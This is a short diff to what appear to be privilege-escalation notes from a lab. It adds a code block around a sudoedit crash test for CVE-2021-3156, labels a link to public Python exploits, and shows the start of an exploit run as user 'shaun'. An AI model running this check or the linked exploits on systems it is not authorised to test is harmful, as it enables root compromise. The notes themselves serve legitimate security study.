@@ -205,9 +205,10 @@ There is also a dedicated toolset for identifying sudo vulnerabilities:
 
 Test for sudo vulnerability 
 
+```bash
 sudoedit -s '\' `perl -e 'print "A" x 65536'`
 sudoedit -s '\' `python3 -c 'print("A" * 65536)'`
-
+```
 
 If the result is a memory corruption error, then the machine is vulnerable
 
@@ -216,7 +217,7 @@ malloc(): corrupted top size
 Aborted
 ```
 
-https://github.com/worawit/CVE-2021-3156
+* python exploits for this vuln: https://github.com/worawit/CVE-2021-3156
 
 ```bash
 shaun@doctor:/tmp/blub/CVE-2021-3156$ python3 exploit_nss.py
